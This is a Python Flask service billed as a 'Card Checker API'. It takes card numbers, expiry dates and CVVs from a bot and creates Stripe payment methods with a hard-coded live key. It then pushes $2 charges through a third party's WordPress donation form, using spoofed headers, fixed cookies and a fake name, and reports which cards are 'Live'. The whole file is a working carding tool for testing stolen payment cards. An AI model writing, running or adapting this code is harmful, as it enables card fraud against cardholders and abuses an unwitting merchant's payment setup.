from flask import Flask, request, jsonify
import requests

app = Flask(name)

@app.route('/')
def home():
    return "Card Checker API Running! ✅"

@app.route('/api/check', methods=['POST'])
def check_card():
    try:
        # Get card details from bot
        data = request.json
        card = data.get('card')
        month = data.get('month')
        year = data.get('year')
        cvv = data.get('cvv')
        
        # Step 1: Create Stripe Payment Method
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        stripe_data = f'type=card&card[number]={card}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&key=pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
        
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', 
                                  headers=headers, 
                                  data=stripe_data)
        
        if response1.status_code != 200:
            return jsonify({
                'status': 'declined',
                'message': '❌ Card Invalid - Payment Method Creation Failed',
                'code': 'invalid_card'
            })
        
        pm_id = response1.json()["id"]
        
        # Step 2: Charge the card
        cookies = {
            '__stripe_mid': '5589d9ad-f18f-464b-ae00-84b30402690224eed2',
            '__stripe_sid': '586ff269-8660-46e0-980a-baf9acd05345f84e30',
        }
        
        headers2 = {
            'authority': 'allcoughedup.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://allcoughedup.com',
            'referer': 'https://allcoughedup.com/registry/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        charge_data = {
            'data': f'fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce=c39a9282fe&_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=DevBrio&email=devbroio%40gmail.com&custom-payment-amount=2&description=Thanks%20You&payment_method=stripe&stripe_payment_method_id={pm_id}',
            'action': 'fluentform_submit',
            'form_id': '4',
        }
        
        response2 = requests.post(
            'https://allcoughedup.com/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers2,
            data=charge_data,
            timeout=30
        )
        
        result = response2.text
        
        # Check response
        if 'success' in result.lower():
            return jsonify({
                'status': 'approved',
                'message': '✅ Card Live - Charged $2',
                'code': 'approved',
                'response': result
            })
        elif 'insufficient' in result.lower():
            return jsonify({
                'status': 'approved',
                'message': '✅ Card Live - Insufficient Funds',
                'code': 'insufficient_funds'
            })
        elif 'decline' in result.lower():
            return jsonify({
                'status': 'declined',
                'message': '❌ Card Declined',
                'code': 'declined'
            })
        else:
            return jsonify({
                'status': 'unknown',
                'message': '⚠️ Unknown Response',
                'response': result
            })
            
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'❌ Error: {str(e)}',
            'code': 'exception'
        })

if name == 'main':
    app.run(host='0.0.0.0', port=5000, debug=True)
